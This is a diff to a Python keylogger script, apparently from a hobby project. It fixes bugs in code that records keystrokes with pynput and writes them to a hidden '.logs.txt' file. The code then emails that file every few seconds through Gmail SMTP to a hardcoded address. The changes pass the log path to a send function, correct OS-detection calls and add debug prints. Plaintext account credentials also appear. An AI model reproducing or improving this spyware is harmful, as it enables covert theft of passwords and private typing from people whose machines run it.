@@ -5,12 +5,11 @@ from email.mime.base import MIMEBase
 from email import encoders
 import threading
 from tkinter import Checkbutton
-
 from pynput import keyboard
 import platform
 import getpass
 
-mail_content = "Mail with attachment."
+mail_content = "Mail with attachment."  # Just the text for sending the attachment
 sender_address = 'leodahal44@gmail.com'  # Enter your fake id here.
 sender_pass = 'programmerleodahal'  # Original pass of fake id
 receiver_address = 'leodahal44@gmail.com'  # Enter the receiver id
@@ -34,7 +33,7 @@ class sendMail:
         errorSession = smtplib.SMTP('smtp.gmail.com', 587)
         errorSession.starttls()
         errorSession.login(sender_address, sender_pass)
-        sendMail.sendMessage("", errorSession, sender_address, receiver_address)
+        sendMail.sendMessage("There were errors encountered while running the keylogger on the specific machine.", errorSession, sender_address, receiver_address)
 
     def sendMailTimer():
         timer = threading.Timer(60, sendMail.sendMailFucker)
@@ -49,7 +48,7 @@ class sendMail:
         except ConnectionError:
             return 0
 
-    def sendMailFucker():
+    def sendMailFucker(pathOfFile):
         global message, attach_file, session, mail_content
         try:
             # Setup the MIME
@@ -60,7 +59,7 @@ class sendMail:
             message.attach(MIMEText(mail_content, 'plain'))
 
             try:
-                attach_file = open(".logs.txt", 'rb')  # Open the file as binary mode
+                attach_file = open(pathOfFile, 'rb')  # Open the file as binary mode
             except FileNotFoundError:
                 sendMail.sendmailonly("")
 
@@ -93,19 +92,22 @@ class osrelated:
         except:
             return 0
 
+    @staticmethod
     def getOs():
+        # print(platform.system())
         try:
             os = platform.system()
             if os == "Windows":
                 return "shit"
             elif os == "Linux":
-                print("\nLinux\n")
+                # print("\nLinux\n")
                 return "wow"
             elif os == "Darwin":
                 return "mac"
             else:
                 return 0
         except:
+            # print("Caught expection while determining os name")
             return 0
 
 
@@ -143,20 +145,23 @@ path = ""
 
 def declarePathForSave():
     global path
-    if osrelated.getOs == "shit":
+    if osrelated.getOs() == "shit":
         # windows
         path = "C:\\"
-    elif osrelated.getOs == "wow":
+    elif osrelated.getOs() == "wow":
         # linux based os
+        print("Success Linux")
         if osrelated.getUserName():
             path = "/" + osrelated.getUserName() + "/"
             print(path)
         else:
             path = "/"
-    elif osrelated.getOs == "mac":
+        print(path)
+    elif osrelated.getOs() == "mac":
         # mac os
         path = ""
     else:
+        print("Os not determined")
         # the os couldnot be determined
         path = ""
 
@@ -168,11 +173,12 @@ def saveLogs():
     try:
         global logs, path
         print(path)
+        filepath = path + ".logs.txt"
         saveFile = open(path + ".logs.txt", "a+")
         saveFile.write(logs)
         logs = "\n"
         saveFile.close()
-        sendMail.sendMailFucker()
+        sendMail.sendMailFucker(filepath)
         saveTimer = threading.Timer(5, saveLogs)
         saveTimer.start()
     except FileNotFoundError:
